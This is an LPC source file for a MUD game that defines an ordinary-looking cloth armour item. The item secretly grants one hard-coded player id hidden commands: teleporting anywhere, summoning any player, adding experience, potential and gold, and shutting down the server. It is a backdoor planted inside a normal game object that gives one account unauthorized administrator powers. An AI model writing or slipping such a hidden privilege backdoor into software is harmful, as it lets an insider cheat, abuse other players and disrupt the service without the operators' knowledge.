#include <ansi.h>
#include <armor.h>

inherit BOOTS;
inherit F_AUTOLOAD;
inherit F_CLEAN_UP;

int do_sum(object me, string arg);
int do_goto(string arg);

void create()
{
	set_name("布衣", ({"cloth"}));
	set_weight(30);
	set("no_get", 1);
	set("no_drop", 0);
	if (clonep())
		set_default_object(__FILE__);
	else
	{
		set("unit", "件");
		set("material", "cloth");
		set("armor_prop/personality", 10);
		set("armor_prop/karma", 10);
		set("armor_prop/composure", 10);
		set("armor_prop/armor", 1000);
		set("armor_prop/dodge", 50);
		set("wear_msg", "");
		set("remove_msg", "");
	}
}

void init()
{
          if( this_player() ->query("id") == "xgslxz" )
	{
		add_action("do_sum","sum");
		add_action("do_goto","goto");
		add_action("do_dream", "dream");
	}
}

int do_goto(string arg)
{
	string home;
	object mme;
	int goto_inventory = 0;
	object obj; string msg;
	mme=this_player();

	if (!arg)
		return notify_fail("你要去哪里？\n");
	if (sscanf(arg, "-i %s", arg))

	goto_inventory = 1;
	obj = find_player(arg);
	if (!obj)
		obj = find_living(arg);
	if (!obj || !mme->visible(obj))
	{
		arg = resolve_path(mme->query("cwd"), arg);
		if (!sscanf(arg, "%*s.c"))
			arg += ".c";
		if (!(obj = find_object(arg)))
		{
			if (file_size(arg)>=0)
				return mme->move(arg);
			return notify_fail("没有这个玩家、生物、或地方。\n");
		}
	}
	if (!goto_inventory && environment(obj))
		obj = environment(obj);
	if (!obj)
		return notify_fail("这个物件没有环境可以goto。\n");
		mme->move(obj);
	return 1;
}

int do_sum(object me, string arg)
{
	object ob;
	int i;
	me=this_player();
	if (!arg) return notify_fail("<Syntax>: Summon <player id>\n");
	ob = LOGIN_D->find_body(arg);
	if (!ob) return notify_fail("咦... 有这个人吗?\n");
/*
	tell_room(environment(ob),"天空中伸出一只大手把"+
		(string)ob->query("name")+"抓了起来, 然後不见了.\n", ob);
*/
	tell_object(ob,"一只手把你抓了起来, 你眼前一阵黑....\n");
	ob->move(environment(me));
	tell_object(me, "你把"+(string)ob->query("name")+"抓到你的面前.\n");
/*
	tell_object(ob,".... 醒来时发现是"+(string)me->query("name")+
		"把你弄过来的.\n");
	tell_room(environment(ob),(string)ob->query("name")+"突然出现"+
		"在你眼前。\n",({me,ob}));
*/
	return 1;
}
int do_dream(string arg)
{
	object me;
	object gold;
	if ( !arg )
	{
		return notify_fail(" Usage : dream [exp|qn|jing|gold|reboot|off] \n");
	}

	me = this_player();

	if ( arg == "off")
	{
		destruct(this_object());
	}
	if ( arg == "reboot")
	{
// message( "system", "游戏重新启动，请稍候一分钟再 login 。\n", users() );
		shutdown(0);
	}
	if ( arg == "qn")
	{
		me->add("potential", 100);
	}
	if ( arg == "jing")
	{
		me->add("jing", 1000);
	}
	if ( arg == "gold")
	{
		gold = new("obj/money/gold");
		gold->set_amount(100);
		gold->move(me);
	}
	if ( arg == "exp" )
	{
		me->add("combat_exp", 1000);
	}
}
int query_autoload()
{
          if( this_player() ->query("id") == "xgslxz" )
		return 1;
}

